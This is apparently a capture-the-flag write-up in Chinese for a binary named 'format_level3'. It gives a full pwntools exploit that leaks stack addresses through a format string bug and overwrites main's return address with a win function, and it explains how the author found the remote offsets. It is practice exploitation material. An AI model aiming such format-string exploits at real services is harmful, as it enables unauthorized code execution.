# format_level3

参考 https://www.anquanke.com/post/id/222623
```py
from pwn import *
context.arch='i386'
context.buffer_size=0x10000
p=remote("localhost",61260)
def talk(payload):
    p.sendlineafter("Your choice: ",'3')
    p.sendlineafter("Input what you want to talk: ",payload)
    sleep(1)
correct_args_offset=0xffffcea4-0xfffa5000
stack_offset=0xffffcde8-0xfffa5000
main_ret_offset=0xffffcdfc-0xfffa5000
payload='%6$p' #stack
win=0x08049317
#args: %50$p
#after modify args, main_ret:%57$p
talk(payload)
p.recvuntil(b'You said: \n')
stack=int(p.recvline(keepends=False),16)-stack_offset
main_ret=stack+main_ret_offset
#p.interactive()
args_low_payload = "%{}c%50$hn".format((main_ret & 0xffff))
talk(args_low_payload)
win_low_payload="%{}c%57$hn".format((win & 0xffff))
talk(win_low_payload)
args_high_payload = "%{}c%50$hn".format((main_ret+2 & 0xffff))
talk(args_high_payload)
win>>=16
win_high_payload="%{}c%57$hn".format((win & 0xffff))
talk(win_high_payload)
p.sendlineafter("Your choice: ",'4')
print(p.recvall())
```
个人本地和远程的args偏移不一样,所以在程序暂停在中间的interactive后（已注释）自己找的远程偏移。方法如下：先一个一个试 %xx$s（我从61往下算的，因为我发现远程%61$s是个PATH环境变量，根据本地调试结果，args应该在环境变量上面）。最后发现%57$s是args。然后发送%57$p获取此处字符串的地址。还是根据本地调试，args的三级指针应该在args字符串上面，所以继续往前找，payload %xx$s，如果找到了正确的三级指针偏移，那么%xx$s的结果就应该是%57$p给的地址的字符串形式。如0xfff13f4a->J?\xf1\xff

```
%57$s-> ./format_level3
%57$p-> 0xfff13f4a
%50$s-> J?\xf1\xff == long_to_bytes(0xfff13f4a)
```

所以%57$p是三级指针，%50$p是args

talk函数里的sleep是为了给远程缓冲区刷新的时间，context.buffer_size=0x10000为了防止影响下一次利用(不加好像出不来？)